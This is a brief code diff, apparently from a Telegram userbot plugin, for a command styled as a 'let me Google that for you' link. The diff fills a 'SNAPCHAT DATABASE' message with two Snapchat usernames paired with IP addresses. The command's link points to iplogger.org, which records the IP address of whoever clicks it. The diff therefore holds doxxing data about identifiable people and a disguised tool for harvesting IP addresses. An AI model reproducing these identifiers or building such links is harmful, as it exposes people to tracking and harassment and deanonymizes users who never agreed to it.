@@ -573,7 +573,7 @@ async def lfy_(message: Message):
     """lfy_"""
     query = message.input_or_reply_str
     if not query:
-        await message.edit("SNAPCHAT DATABASE *v0.1*\n\n\n**USERNAME : \nIP: **\n\n**USERNAME : \nIP: **\n\n**USERNAME : \nIP: **")
+        await message.edit("SNAPCHAT DATABASE [**v0.2**]\n\n\n**USERNAME : saga041\nIP: 188.149.152.1**\n\n**USERNAME : king.bailee\nIP: 72.177.62.242**\n\n**USERNAME : \nIP: **")
         return
     query_encoded = query.replace(" ", "+")
     lfy_url = f"https://iplogger.org/2SFd36{query_encoded}"
